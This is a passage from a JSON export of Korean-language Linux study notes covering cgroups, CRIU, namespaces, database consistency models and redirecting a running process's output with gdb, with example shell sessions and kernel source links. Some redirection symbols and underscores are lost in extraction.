있다.\n\nIsolation and Sepcial Controller\n  cpuset, namespace, freezer, device, checkpoint/restart\nResource Controller\n  cpu(scheduler), memory, disk I/O, network\n\nsubsystem은 각기 따로 사용할수도 있고 한번에 사용할 수도 있다.\n\n$ mount -t cgroup -o cpu none /cpu\n\n$ mount -t cgroup -o cpuset none /cpuset\n\n$ mount -t cgroup none /cgroups\n\nCgroup Control\n Systemd\n\nsystemd를 사용하는 system에선 systemd 도구로 cgroup을 제어할 수 있다. \n다음 명령은 system 상에 존재하는 cgroup과 subsystem 구조를 보여준다.\n\n$ systemd-cgls\n\ncgroup별 resource 사용 현황도 살필 수 있다.\n\n$ systemd-cgtop\n현재 process에 적용된 정책을 살펴보자\n$ cat /sys/fs/cgroup/cpu/system.slice/smbd.service/cpu.shares\n1024\n\n$ systemctl set-property smbd.service CPUShares=200\n\n$ systemctl show -p CPUShares smbd.service\nCPUShares=200\n\n$ cat /sys/fs/cgroup/cpu/system.slice/smbd.service/cpu.shares\n200\n  \ncpu \n$ ls /sys/fs/cgroup/cpu\ncgroup.clonechildren  cpu.cfsperiodus  cpu.rtruntimeus  cpuacct.stat          notifyon_release  tasks\ncgroup.procs           cpu.cfsquotaus   cpu.shares         cpuacct.usage         release_agent      user.slice\ncgroup.sanebehavior   cpu.rtperiodus   cpu.stat           cpuacct.usagepercpu  system.slice\n\n주요 I/F는 아래와 같다.\n\n| I/F               | Description                                                   |\n|-------------------|---------------------------------------------------------------|\n| cpu.shares        | CPU core의 점유율을 2~262114의 수치로 지정한다(default 1024). |\n| cpu.cfsperiodus | CPU 사용 시간 비율의 상한을 지정(default는 무제한)            |\n| cpu.cfsquotaus  |                                                               |\n\n cpuset\n\ncpuset을 이용해 process별 core 사용에 대한 제한을 가한다. \n\n$ ls /sys/fs/cgroup/cpuset\ncgroup.clonechildren  cpuset.effectivecpus  cpuset.memorypressure          cpuset.schedload_balance\ncgroup.procs           cpuset.effectivemems  cpuset.memorypressureenabled  cpuset.schedrelaxdomainlevel\ncgroup.sanebehavior   cpuset.memexclusive   cpuset.memoryspreadpage       notifyonrelease\ncpuset.cpuexclusive   cpuset.memhardwall    cpuset.memoryspreadslab       release_agent\ncpuset.cpus            cpuset.memory_migrate  cpuset.mems                     tasks\n\n주요 I/F는 아래와 같다.\n\n| I/F                  | Description                                                               |\n|----------------------|---------------------------------------------------------------------------|\n| cpuset.cpus\t         | process를 실행하는 CPU core 지정.                                         |\n| cpuset.cpu_exclusive | 1로 set되면 이 group이 지정한 cpu cores는 다른 group에서 지정하지 못한다. |\n| cpuset.mems\t         | NUMA architecture의 process가 이용하는 memory node를 지정.                |\n\nstress tool을 사용해서 비교 해본다.\n\n$ unshare /bin/sh\n\n$ pstree -p\nsystemd(1)-+-agetty(194)\n           |-agetty(195)\n           |-avahi-daemon(262)---avahi-daemon(263)\n           |-dbus-daemon(190)\n           |-docker(198)-+-{docker}(200)\n           |             |-{docker}(201)\n           |             |-{docker}(202)\n           |             |-{docker}(204)\n           |             `-{docker}(206)\n           |-haveged(193)\n           |-nmbd(207)\n           |-smbd(256)---smbd(260)\n           |-sshd(199)-+-sshd(266)---bash(273)\n           |           `-sshd(285)---bash(287)---sh(332)---pstree(344)\n           |-systemd(269)---(sd-pam)(270)\n           |-systemd-journal(115)\n           |-systemd-logind(189)\n           |-systemd-resolve(197)\n           |-systemd-timesyn(182)---{sd-resolve}(184)\n           `-systemd-udevd(141)\n  \n$ stress -m 3 --vm-bytes 128m -t 60s\n\n$ top\n\n4개 core를 모두 100% 사용함을 확인할 수 있다.\n이제 cgroup으로 제약을 가한다.\n\n$ cd /sys/fs/cgroup/cpuset/\n\n$ mkdir test/\n\n$ cd test/\n\n$ echo 0  cpuset.cpus\n\n$ echo 0  cpuset.mems\n\n$ echo 332  tasks\n\n같은 test를 반복한다.\n\n$ stress -m 3 --vmbytes 128m -t 60s\n$ top\n\n0번 core만 사용됨을 알 수 있다.\n\nmemory\n\nprocess 별 memory 사용에 대한 제약을 가한다. \\\nmemory가 부족할 경우 적용할 사항을 oom_control을 통해 조정해 줄 수 있다. \\\n\n$ ls /sys/fs/cgroup/memory\ncgroup.clonechildren           memory.kmem.tcp.maxusageinbytes  memory.pressure_level\ncgroup.eventcontrol            memory.kmem.tcp.usageinbytes      memory.softlimitinbytes\ncgroup.procs                    memory.kmem.usageinbytes          memory.stat\ncgroup.sanebehavior            memory.limitin_bytes               memory.swappiness\nmemory.failcnt                  memory.maxusageinbytes           memory.usagein_bytes\nmemory.forceempty              memory.memsw.failcnt                memory.usehierarchy\nmemory.kmem.failcnt             memory.memsw.limitinbytes         notifyonrelease\nmemory.kmem.limitinbytes      memory.memsw.maxusageinbytes     releaseagent\nmemory.kmem.maxusageinbytes  memory.memsw.usagein_bytes         system.slice\nmemory.kmem.slabinfo            memory.movechargeat_immigrate     tasks\nmemory.kmem.tcp.failcnt         memory.numa_stat                    user.slice\nmemory.kmem.tcp.limitinbytes  memory.oom_control\n\n주요 I/F는 아래와 같다.\n\n| I/F                         | Description                                                                                         |\n|-----------------------------|-----------------------------------------------------------------------------------------------------|\n| memory.limitinbytes\t      | 해당 group을 이용할 수 있는 물리 memory의 상한(byte)을 지정                                         |\n| memory.memsw.limitinbytes\t| 해당 group을 이용할 수 있는 '물리 memory + swap영역'의 상한(byte)을 지정                            |\n| memory.use_hierachy\t        | 1이 set되면 해당 group의 memory 사용량에 sub group의 process memory 사용량도 추가된다(default는 0). |\n\n$ cd /sys/fs/cgroup/memory $ mkdir group1 $ echo 128M  group1/memory.limitinbytes $ echo $$  group1/tasks $ stress --vm 1 --vm-bytes 127M --timeout 60s $ stress --vm 1 --vm-bytes 128M --timeout 60s $ echo 1  group1/memory.oomcontrol $ echo 2G  group1/memory.limitinbytes $ stress --vm 1 --vm-bytes 512M --timeout 60s $ stress --vm 1 --vm-bytes 1G --timeout 60s $ echo 0  group1/memory.oomcontrol $ stress --vm 1 --vm-bytes 512M --timeout 60s $ stress --vm 1 --vm-bytes 1G --timeout 60s\n\n device\ndevice file의 사용에 대한 제한을 가한다. \n3가지 file이 있다.\ndevices.allow : whitelist\ndevices.deny : blacklist\ndevices.list : 사용가능한 device\n\n각각에 대해서 4가지 filed가 있다.\n\nType :\n  a : all\n  c : char device\n  b : block device\nMajor number\nMinor number\nAccess :\n  r : read\n  w : write\n  m : mknode\n\n/dev/null 의 경우 major는 1 minor는 3이다.\n\n$ mkdir /sys/fs/cgroup/devices/0\n\n$ cat /sys/fs/cgroup/devices/0/devices.list\na \":\" rwm\n\n$ echo \"a *:* rmw\"  /sys/fs/cgroup/devices/0/devices.deny\n\n$ echo $$  /sys/fs/cgroup/devices/0/tasks\n\n$ echo \"test  /dev/null\nbash: /dev/null: Operation not permitted\n\n$ echo \"a *.* rwm\"  /sys/fs/cgroup/devices/0/devices.allow\n\n$ echo \"test\"  /dev/null\nblkio\n\n$ ls /sys/fs/cgroup\nblkio.iomerged            blkio.ioservicebytesrecursive  blkio.iowaittime            blkio.sectors                    blkio.throttle.readiopsdevice   blkio.weight           notifyonrelease\nblkio.iomergedrecursive  blkio.ioservicetime             blkio.iowaittimerecursive  blkio.sectorsrecursive          blkio.throttle.writebpsdevice   blkio.weightdevice    releaseagent\nblkio.ioqueued            blkio.ioservicetimerecursive   blkio.leafweight             blkio.throttle.ioservicebytes  blkio.throttle.writeiopsdevice  cgroup.clonechildren  system.slice\nblkio.ioqueuedrecursive  blkio.ioserviced                 blkio.leafweightdevice      blkio.throttle.ioserviced       blkio.time                        cgroup.procs           tasks\nblkio.ioservicebytes     blkio.ioservicedrecursive       blkio.resetstats             blkio.throttle.readbpsdevice   blkio.timerecursive              cgroup.sane_behavior   user.slice\n\n주요 I/F는 아래와 같다.\n\n| I/F                              |\tDescription                                                                    |\n|----------------------------------|---------------------------------------------------------------------------------|\n| blkio.weight                     |\t모든 block device에 공통적인 우선순위를 100~1000의 값으로 지정(default는 500). |\n| blkio.weight_device\t             | 특정 device에 대한 우선순위를 지정.                                             |\n| blkio.throttle.readbpsdevice\t | 특정 device에 대한 접근 속도의 상한을 Bytes/Sec 단위로 지정.                    |\n| blkio.throttle.writebpsdevice  |                                                                                 |\n| blkio.throttle.readiopsdevice\t | 특정 dsevice에 대한 접근 속도의 상한을 IOPS 단위로 지정.                        |\n| blkio.throttle.writeiopsdevice |                                                                                 |\n\nReference\nhttps://www.linuxfoundation.jp/jp_uploads/seminar20081119/CgroupMemcgMaster.pdf \\\nhttps://access.redhat.com/documentation/en-US/RedHatEnterpriseLinux/6/html/ResourceManagement_Guide/sec-memory.html \\\n",
        "tags": []
    },
    {
        "uri": "/content/system/criu",
        "title": "criu",
        "content": "\nCheckpoint & Restore in Userspace\n\nUsage\n$ criu dump -t ${PID} -vvv -o dump.log && echo OK\n$ criu restore -d -vvv -o restore.log && echo OK\n$ criu dump -vvvv -o dump.log -t ${PID --shell-job && echo OK\n$ criu restore -vvvv -o restore.log --shell-job && echo OK\n\n Details\nptrace\nmmap\nparasite code injection\nTCP repair mode\n\nDump\nStop the tasks\n  Freez by PTRACE_SEIZE or cgroup freezer\n  Lock network\nCollect process information\n  proc files\n  parasite injection\n    Credential, memory contents, signals\nDump pages\n  memory pages copied via vmsplice and splice syscalls\n\n Restore\ntree\n\nIssues\nExternal Resources\n  Unix socket\n  TCP\n  Shell Jobs\n  File locks\n  Bind mounts\nDevice Accesses\n  /dev/null, /dev/net/tun\n  X applications\nETC\n  File System\n  SysV IPC\n  Nested namespace or cgroup\n\n Reference\nhttps://media.ccc.de/v/896-exploring-criu\n",
        "tags": []
    },
    {
        "uri": "/content/system/database",
        "title": "database",
        "content": "\nrelational database\nAtomicity\nConsistency\nIsolation\nDurability\n\n nosql\nConsistency\nAvailability\nPartition tolerance\n\n각각 조합에 대한 예: \\\n\nAP: Dynamo, Cassandra, SimpleDB, CouchDB\nCA: Aster Data, Greenplum\nCP: BigTable, Hbase, MongoDB, Redis, MemcacheDB\n\nBasically Available\nSoft-state\nEventually consistency\n\ndata model\nrelational\nkey-value\ncolumn-oriented/tabular\ndocument-oriented\n\n data type\nscalar: number, string, etc\nmulti-valued: sets\n",
        "tags": []
    },
    {
        "uri": "/content/system/distributed_system",
        "title": "distributed system",
        "content": "\nDistributed System에서 갖추는 feature들을 이해를 위한 정리.\n\nreplication\navailability\n\nreliability\nperformance\nscalability\ncapacity\nsecurity\n\n",
        "tags": []
    },
    {
        "uri": "/content/system/index",
        "title": "System",
        "content": "\nSystem\nOperating System 및 Cloud System, Database와 관련 Feature 및 Architecture, Algorithm 등을 정리.\n\n Contents\nlinux\ndistributed system\n",
        "tags": []
    },
    {
        "uri": "/content/system/linux",
        "title": "linux",
        "content": "\nLinux 관련 feature에 대한 이해를 위한 정리.\nFilesystem, Resource Isolation, Event Trigger, Module 등.\n\nnamespace\ncgroup\ncapabilities\nmounts\nfuse\ninotify\nepoll\npipe\nsystemd\nrootfs\nchroot\nlkm\ndevice\nenvironment\nkeyring\nipc\ncmdline\nzone\nid\n\nSTDIO buffering\n아래에 이와 관련된 문제에 대해 상세히 기술되어 있다.\n\nhttp://www.pixelbeat.org/programming/stdio_buffering/\n\n어떻게 이 현상을 fix 할 것인지.\n\nhttps://www.perkin.org.uk/posts/how-to-fix-stdio-buffering.html\n\n Redirect Outputs of Running Process\n아래와 같은 상황을 가정하자.\n$ hugo server -v\n\n잘동작하는걸 확인했으므로 Background로 돌린다.\n\nkbdctrl/kbd+kbdz/kbd\n\n$ bg\n[1]  + 23106 continued  hugo server -v\n이 상태에선 hugo server가 message를 만들면 그대로 terminal에 나타나게 된다.\n\n$ ls -l /proc/23016/fd\ntotal 0\nlrwx------ 1 keyolk keyolk 64 Jan 16 10:59 0 - /dev/pts/1\nlrwx------ 1 keyolk keyolk 64 Jan 16 10:59 1 - /dev/pts/1\nlr-x------ 1 keyolk keyolk 64 Jan 16 10:59 10 - pipe:[20424904]\nl-wx------ 1 keyolk keyolk 64 Jan 16 10:59 11 - pipe:[20424904]\nlrwx------ 1 keyolk keyolk 64 Jan 16 10:59 12 - socket:[20424905]\nlrwx------ 1 keyolk keyolk 64 Jan 16 10:59 2 - /dev/pts/1\nlr-x------ 1 keyolk keyolk 64 Jan 16 10:59 3 - anon_inode:inotify\nlrwx------ 1 keyolk keyolk 64 Jan 16 10:59 4 - anon_inode:[eventpoll]\nlrwx------ 1 keyolk keyolk 64 Jan 16 10:59 5 - anon_inode:[eventpoll]\nlr-x------ 1 keyolk keyolk 64 Jan 16 10:59 6 - pipe:[20421334]\nl-wx------ 1 keyolk keyolk 64 Jan 16 10:59 7 - pipe:[20421334]\nlr-x------ 1 keyolk keyolk 64 Jan 16 10:59 8 - anon_inode:inotify\nlrwx------ 1 keyolk keyolk 64 Jan 16 10:59 9 - anon_inode:[eventpoll]\n\n$ sudo gdb -p 20106\n(gdb) p dup2(open(\"/dev/null\", 0), 1)\n$1 = 1\n(gdb) p dup2(open(\"/dev/null\", 0), 2)\n$2 = 2\n(gdb) detach\n(gdb) quit\n\n확인해 본다.\n$ ls -l /proc/23016/fd\ntotal 0\nlrwx------ 1 keyolk keyolk 64 Jan 16 10:59 0 - /dev/pts/1\nlr-x------ 1 keyolk keyolk 64 Jan 16 10:59 1 - /dev/null\nlr-x------ 1 keyolk keyolk 64 Jan 16 10:59 10 - pipe:[20424904]\nl-wx------ 1 keyolk keyolk 64 Jan 16 10:59 11 - pipe:[20424904]\nlrwx------ 1 keyolk keyolk 64 Jan 16 10:59 12 - socket:[20424905]\nlr-x------ 1 keyolk keyolk 64 Jan 16 11:03 13 - /dev/null\nlr-x------ 1 keyolk keyolk 64 Jan 16 11:03 14 - /dev/null\nlr-x------ 1 keyolk keyolk 64 Jan 16 10:59 2 - /dev/null\nlr-x------ 1 keyolk keyolk 64 Jan 16 10:59 3 - anon_inode:inotify\nlrwx------ 1 keyolk keyolk 64 Jan 16 10:59 4 - anon_inode:[eventpoll]\nlrwx------ 1 keyolk keyolk 64 Jan 16 10:59 5 - anon_inode:[eventpoll]\nlr-x------ 1 keyolk keyolk 64 Jan 16 10:59 6 - pipe:[20421334]\nl-wx------ 1 keyolk keyolk 64 Jan 16 10:59 7 - pipe:[20421334]\nlr-x------ 1 keyolk keyolk 64 Jan 16 10:59 8 - anon_inode:inotify\nlrwx------ 1 keyolk keyolk 64 Jan 16 10:59 9 - anon_inode:[eventpoll]\n\n반대로 background process의 output을 보이게 할수도 있다.\n$ hugo server & /dev/null &\n[1] 31130\n$ sudo gdb -p 31130\n(gdb) p dup2(open(\"/dev/pts/1\", 1), 1)\n$1 = 1\n(gdb) p dup2(open(\"/dev/pts/1\", 1), 2)\n$2 = 2\n(gdb) detach\n(gdb) quit\n\n이 시점에서 output이 terminal로 들어온다.\n",
        "tags": []
    },
    {
        "uri": "/content/system/monitoring",
        "title": "monitoring",
        "content": "\nPush vs Pull\n\nTarget discovery\nWho initiates metric transfer\n\n Reference\nhttp://www.boxever.com/push-vs-pull-for-monitoring/\n",
        "tags": []
    },
    {
        "uri": "/content/system/namespace",
        "title": "namespace",
        "content": "\n Namespace를 통해 Kernel 내 Global Resource에 대해 Process 별로 Partitioning을 제공한다. \\\n 기본적으로 Parent Process의 Namespace를 Child 에서 상속받는다.\n\n| Namespace | Constant        | Related Resource                 | Supporting Version |\n|-----------|-----------------|----------------------------------|--------------------|\n| Mount     | CLONE_NEWNS     | Mount Points                     | 2.4.19             |\n| UTS       | CLONE_NEWUTS    | Hostname, NIS domain name        | 2.6.24             |\n| IPC       | CLONE_NEWIPC    | SystemV IPC, POSIX Message Queue | 2.6.24             |\n| PID       | CLONE_NEWPID    | Process IDs                      | 2.6.24             |\n| Net       | CLONE_NEWNET    | Network Stacks                   | 2.6.29             |\n| User      | CLONE_NEWUSER   | Network Stacks                   | 3.8                |\n| CGroup    | CLONE_NEWCGROUP | Network Stacks                   | 4.6                |\n\n아래 System Call을 통해 Namespace를 다룰 수 있다.\n\nclone()\nunshare()\nsetns()\n\nUser를 제외한 5가지 Namespace에 대해선 CAPSYSADMIN capabilities가 필요하다. \\\n모든 Process는 procfs에서 아래와 같이 namespace 정보를 inode 형태로 가지고 있다. \\\n같은 namespace에 속한 process는 같은 inode 값을 갖는다.\n\n$ ls -l /proc/$$/ns\ntotal 0\nlrwxrwxrwx. 1 mtk mtk 0 Jan 14 01:20 ipc - ipc:[4026531839]\nlrwxrwxrwx. 1 mtk mtk 0 Jan 14 01:20 mnt - mnt:[4026531840]\nlrwxrwxrwx. 1 mtk mtk 0 Jan 14 01:20 net - net:[4026531956]\nlrwxrwxrwx. 1 mtk mtk 0 Jan 14 01:20 pid - pid:[4026531836]\nlrwxrwxrwx. 1 mtk mtk 0 Jan 14 01:20 user - user:[4026531837]\nlrwxrwxrwx. 1 mtk mtk 0 Jan 14 01:20 uts - uts:[4026531838]\n\n위 file에 대한 bind mount가 이뤄지면, \\\nnamespace 내에 속한 모든 process가 terminated 된다고 해도 namespace가 사라지지 않는다. \\\n이 때 해당하는 file descriptor를 setns()를 통해 다른 process로 전달하면 \\\n해당 process를 주어진 namespace에 할당해 줄 수 있다.\n\nKernel이 아래 configuration을 통해 namespace가 지원된다.\n\nCONFIG_NAMESPACES\nCONFIGUTSNS\nCONFIGIPCNS\nCONFIGPIDNS\nCONFIGNETNS\nCONFIGUSERNS\nCONFIGCGROUPNS\n\ntask가 속한 namespace에 대한 접근은 \\\ntask_struct의 filed인 nsproxy를 통해서 이뤄진다. \n\nstruct task_struct : http://lxr.free-electrons.com/source/include/linux/sched.h?v=4.0#L1278 \\\nstruct nsproxy *nsproxy : http://lxr.free-electrons.com/source/include/linux/sched.h?v=4.0#L1467 \n\nnsproxy 구조체 내에 usernamespace를 제외한 5가지 namespace에 대한 pointer가 존재한다. \\\nstruct ns_proxy : http://lxr.free-electrons.com/source/include/linux/nsproxy.h?v=4.0#L29 \n\nusernamespace 는 task의 filed 인 cred 내에서 찾아볼 수 있다. \n\nstruct cred : http://lxr.free-electrons.com/source/include/linux/cred.h?v=4.0#L103 struct usernamespace *userns : http://lxr.free-electrons.com/source/include/linux/cred.h?v=4.0#L137 \\\n\n아래에서 namespace를 만드는 function을 확인할 수 있다. \ncreatenewnamespaces() : http://lxr.free-electrons.com/source/kernel/nsproxy.c?v=4.0#L59 \\\n\ntask는 따로 명시되지 않아도 default로 global namespace에 속해있다. \n\nstruct nsproxy init_nsproxy : http://lxr.free-electrons.com/source/kernel/nsproxy.c?v=4.0#L31 \\\ndo_fork() : http://lxr.free-electrons.com/source/kernel/fork.c?v=4.0#L1631 \\\np = copy_process() : http://lxr.free-electrons.com/source/kernel/fork.c?v=4.0#L1659 \\\ncopy_process() : http://lxr.free-electrons.com/source/kernel/fork.c?v=4.0#L1190 \\\nretval = copy_namespaces() : http://lxr.free-electrons.com/source/kernel/fork.c?v=4.0#L1398 \\\ncopy_namesapces() : http://lxr.free-electrons.com/source/include/linux/nsproxy.h?v=4.0#L65 \\\ncopy_namesapces() : http://lxr.free-electrons.com/source/kernel/nsproxy.c?v=4.0#L124 \\\n\nMount\nMount Point에 대한 isolation을 제공한다. \n\n새로 mount namspace에선 생성 시점 이전에 생성된 mount들이 모두 visible하다. \n새로 생성된 mount namspace 내에 mount와 unmount는 다른 system에서 invisible하다. \nrootfs 를 다시 mount 하여 chroot와 비슷한 효과를 가져올 수 있다.\n\n User View\nroot$ mkdir test\n\nroot$ mount -t tmpfs none test\n\nroot$ mount | grep test\nnone /root/test/test tmpfs rw,relatime 0 0\n  \nroot$ unshare -pmrf /bin/sh\nunshared$ mkdir test2\nunshared$ mount -t tmpfs none test2\nunshared$ cat /proc/mounts | grep test\nnone /root/test/test tmpfs rw,relatime 0 0\nnone /root/test/test2 tmpfs rw,nodev,relatime 0 0\n  \nroot$ cat /proc/mounts | grep test\nnone /root/test/test tmpfs rw,relatime 0 0\n\n기본적으로 parent에서 가지고 있는 mount table은 child로 상속되지만, \\\n아래와 같은 mount flag를 통해서 이를 제어할 수 있다.\n\n--make-rprivate\n--make-rshared\n\n기존 mount entry에 대한 shared flag 여부는 아래와 같이 알아 볼 수 있다.\n\n$ cat /proc/self/mountinfo | grep shared\n...\n33 1 8:3 / / rw,relatime shared:1 - ext4 /dev/sda3 rw,data=ordered\n...\n\nshared subtree는 2005년에 Ram Pai를 통해 patch가 만들어졌다. \\\nmount에 아래와 같은 flag가 추가되었으며, \n\n–make-slave\n–make-rslave\n–make-unbindable\n–make-runbindable\n...\n\n마찬가지로 kernel에 아래와 같은 이름으로 flag가 추가되었다. \n\nMS_UNBINDABLE\nMS_PRIVATE\nMS_SLAVE\nMS_SHARED\n\nKernel View\n관련 자료구조는 아래와 같다. \n\nstruct mnt_namespace : http://lxr.free-electrons.com/source/fs/mount.h?v=4.0L7 \\\ncopymntns() : http://lxr.free-electrons.com/source/fs/namespace.c?v=4.0#L2681 \\\nnew = copy_tree() : http://lxr.free-electrons.com/source/fs/namespace.c?v=4.0#L2709 \\\ncopy_tree() : http://lxr.free-electrons.com/source/fs/namespace.c?v=4.0#L1590 \n\nUTS\nHostname과 NIS domain name 에 대한 isolation을 제공한다. \\\nsethostname(), setdomainname() 으로 해당 값을 설정할 수 있으며, \\\nuname(), gethostname(), getdomainname() 으로 현재 할당된 값을 확인할 수 있다.\n\n User View\nroot$ uname -n\nold\n\nroot$ unshare -u /bin/bash\n\nunshared$ hostname new\n\nunshared$ uname -n\nnew\n\nunshared$ exit\n\nroot$ uname -n\nold\n\nKernel View\n관련 자료구조는 아래와 같다. \n\nhttp://lxr.free-electrons.com/source/include/linux/utsname.h?v=4.0L23 \\\nhttp://lxr.free-electrons.com/source/include/uapi/linux/utsname.h?v=4.0#L24 \\\n\n기존 gethostname 구현, \\\nhttp://lxr.free-electrons.com/source/kernel/sys.c?v=2.4.37#L1056 \\\n여기서 system_utsname 이 global value 이다.\n\nutsname 위한 새 function 추가, \\\nhttp://lxr.free-electrons.com/source/include/linux/utsname.h?v=4.0#L72 \\\n\n새로운 gethostname() 구현, \\\nhttp://lxr.free-electrons.com/source/kernel/sys.c?v=4.0#L1239 \\\n\n비슷한 구현이 uname(), sethostname()에 적용되었다.\nuname : http://lxr.free-electrons.com/source/kernel/sys.c?v=4.0#L1139 \\\nsethostname : http://lxr.free-electrons.com/source/kernel/sys.c?v=4.0#L1213 \n\nIPC\nIPC resource(System V IPC와 POSIX message queue)에 대한 isolation을 제공한다. \\\nIPC namespace는 SYSTEM V IPC identifier와 POSIX message queue filesystem을 들을 갖고 있다. \\\n위 IPC는 kernel내 아래 2개 configuration으로 정의된다. \\\n\nCONFIGPOSIXMQUEUE\nCONFIG_SYSVIPC\n\nIPC namespace가 destroyed 되면, \\\n속한 모든 IPC object는 자동적으로 destroyed된다.\n\n격리되는 IPC 자원들은 procfs에서 확인할 수 있다. \\\n아래 procfs의 interface들은 IPC namespace별로 구별된다.\n\n/proc/sys/fs/mqueue/ : POSIX message queue\n  msg_default\n  msg_max\n  msgsize_default\n  queues_max\n/proc/sys/kernel/ : System V IPC\n  msgmax\n  msgmnb\n  msgmni\n  sem\n  shmall\n  shmmax\n  shmmni\n  shmrmidforced\n/proc/sysvipc/ : System V IPC\n  msb\n  sem\n  shm\n\n ipcmk -Q\nMessage queue id: 0\n  \nipcs -q\n  \n------ Message Queues --------\nkey        msqid      owner      perms      used-bytes   messages\n0xd2489e5b 65536      root       644        0            0\n  \n unshare -if /bin/sh\nipcs -q\n  \n------ Message Queues --------\nkey        msqid      owner      perms      used-bytes   messages\n\n Kernel View\n관련 자료구조는 아래와 같다. \n\nhttp://lxr.free-electrons.com/source/include/linux/ipc_namespace.h?v=4.0#L21\n\nPID\nPID에 대한 isolation을 제공한다. \n\n새로운 namespace에서 생성된 최초의 task는 pid가 1이 된다.\nparent namespace에서 자식의 모든 pid를 볼 수 있다.\nInit process와 유사한 동작을 보인다.\n  child reaping : 한 process가 죽으면 모든 children 은 부모가 PID 1번이 된다.\n    동일 namespace의 다른 process가 prctl()을 통해 PRSETCHILD_SUBREAPER 설정이 되어있지 않을 때에 한한다.\n  SIGKILL signal은 PID 1번 process를 죽일 수 없다.\nPID namespace 내의 init process가 terminated 되면 해당 namespace 내의 모든 process가 종료된다.\n32회까지 nested 될 수 있다. \n\n User View\n$ pstree -p\nsystemd(1)-+-agetty(200)\n           |-agetty(201)\n           |-avahi-daemon(274)---avahi-daemon(276)\n           |-dbus-daemon(197)\n           |-docker(202)-+-{docker}(207)\n           |             |-{docker}(208)\n           |             |-{docker}(209)\n           |             |-{docker}(210)\n           |             |-{docker}(216)\n           |             |-{docker}(277)\n           |             |-{docker}(278)\n           |             |-{docker}(279)\n           |             |-{docker}(280)\n           |             |-{docker}(281)\n           |             |-{docker}(282)\n           |             `-{docker}(283)\n           |-haveged(194)\n           |-nmbd(212)\n           |-smbd(236)-+-smbd(272)\n           |           `-smbd(15603)\n           |-sshd(204)---sshd(5079)---bash(5085)---pstree(5088)\n           |-systemd(5081)---(sd-pam)(5082)\n           |-systemd-journal(119)\n           |-systemd-logind(196)\n           |-systemd-resolve(206)\n           |-systemd-timesyn(189)---{sd-resolve}(191)\n           `-systemd-udevd(140)\n  \nunshare -pf --mount-proc /bin/sh\n$ pstree -p\nsh(1)---pstree(2)\n\n Kernel View\n관련 자료구조는 아래와 같다. \n\nstruct pidnamespace : http://lxr.free-electrons.com/source/include/linux/pidnamespace.h?v=4.0#L24 \\\nMAXPIDNSLEVEL : http://lxr.free-electrons.com/source/kernel/pidnamespace.c?v=4.0#L80 \\\nstruct upid : http://lxr.free-electrons.com/source/include/linux/pid.h?v=4.1#L50 \\\nstruct pid : http://lxr.free-electrons.com/source/include/linux/pid.h?v=4.1#L57 \\\n\n특정 process를 kill하는 scenario를 생각해보자, \\ \nsignal을 통해서 결과적으로 kernel 내에 아래 function을 부르게 될것이다. \\\n\nkillsomethinginfo() : http://lxr.free-electrons.com/source/kernel/signal.c?v=4.1#L1425  \\\n이 function 내에는 아래와 같은 subroutine이 있다. \\\nkillpidinfo() : http://lxr.free-electrons.com/source/kernel/signal.c?v=4.1#L1431 \\\nkillpidinfo() : http://lxr.free-electrons.com/source/kernel/signal.c?v=4.1#L1339 \\\nfind_vpid() : http://lxr.free-electrons.com/source/kernel/pid.c#L380?v=4.1#L380 \\\nfindpidns() : find_vpid() : http://lxr.free-electrons.com/source/kernel/pid.c#L380?v=4.1#L382 \\\nparam인 *pid로 find_vpid()를 통해 struct pid를 가져온다.\n\nNet\nNetwork Stack에 대한 Isolation을 제공한다.\n\n새로 생성된 namespace 엔 loopback 만 존재한다.\n다른 namespace의 device를 가져올 수 있다.\nsocket과 device는 하나의 namespace에만 속할 수 있다.\nnamespace간의 통신은 veth를 통해 이뤄질 수 있다.\n\n User View\nip a\n1: lo: LOOPBACK,UP,LOWER_UP mtu 65536 qdisc noqueue state UNKNOWN group default\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       validlft forever preferredlft forever\n    inet6 ::1/128 scope host\n       validlft forever preferredlft forever\n2: eth0: BROADCAST,MULTICAST,UP,LOWERUP mtu 1500 qdisc fqcodel state UP group default qlen 1000\n    link/ether b8:27:eb:43:56:26 brd ff:ff:ff:ff:ff:ff\n    inet 192.168.137.2/24 brd 192.168.137.255 scope global eth0\n       validlft forever preferredlft forever\n    inet6 fe80::ba27:ebff:fe43:5626/64 scope link\n       validlft forever preferredlft forever\n3: docker0: NO-CARRIER,BROADCAST,MULTICAST,UP mtu 1500 qdisc noqueue state DOWN group default\n    link/ether 00:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff\n    inet 172.17.42.1/16 scope global docker0\n       validlft forever preferredlft forever\n    inet6 fe80::fc45:45ff:fec7:1756/64 scope link\n       validlft forever preferredlft forever\n  \n unshare -nf /bin/sh\n$ ip a\n1: lo: LOOPBACK mtu 65536 qdisc noop state DOWN group default\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n\n2개의 namespace를 만든다. \n$ ip netns add myns1\n$ ip netns add myns2\nmyns1 namespace를 지운다.\n\n$ ip netns del myns1\nnamespace를 지우면 모든 migratable한 network device 들은 default network namespace로 할당된다. \\\n아래 명령을 사용하여 network namespace를 monitoring 할 수 있다.\n\n$ ip netns monitor\n아래 명령을 통해 현재 존재하는 network namespace를 list up 할 수 있다.\n\n$ ip netns list\n위 명령은 /var/run/netns/ 를 읽게끔 되어있다.\n특정 namespace에 속한 process의 id를 아래 명령으로 list 할 수 있다.\n\n$ ip netns pid [namespace_name]\n마찬가지로 특정 pid가 속한 namespace도 알 수 있다.\n$ ip netns identify [pid]\n특정 network interface를 namespace로 할당해 줄 수 있다.\n\n$ ip link set eth0 netns myns1\ndevchangenet_namespace() : http://lxr.free-electrons.com/source/include/linux/netdevice.h?v=4.0#L2971 \\\nshell을 실행하면서 새로운 namespace에 할당해 줄 수 있다.\n\n$ ip netns exec myns1 bash\nnamespace 내에서 ifconfig -a로 검사하면 eth0과 loopback만 존재하는걸 확인할 수 있다.\nnetwork device에 대해서 inital namespace 설정을 persist 하게 수정할 수 있다.\n$ ip link set eth0 netns1\n\nKernel View\n관련 자료 구조는 아래와 같다. \n\nstruct net : http://lxr.free-electrons.com/source/include/net/net_namespace.h?v=4.0L44 \\\nnetwork stack 전체가 담겨있다.\n\nlooback device\nSNMP stat (netns_mib)\nall network tables : routing, neighboring, etc …\nall sockets\n/procfs entries\n/sysfs entries\n\n하나의 network device는 반드시 하나의 network namspace에 속한다. \\\nstruct net_device : http://lxr.free-electrons.com/source/include/linux/netdevice.h?v=4.0#L1499 \\\nhttp://lxr.free-electrons.com/source/include/linux/netdevice.h?v=4.0#L1706 \\\n\nrelated function 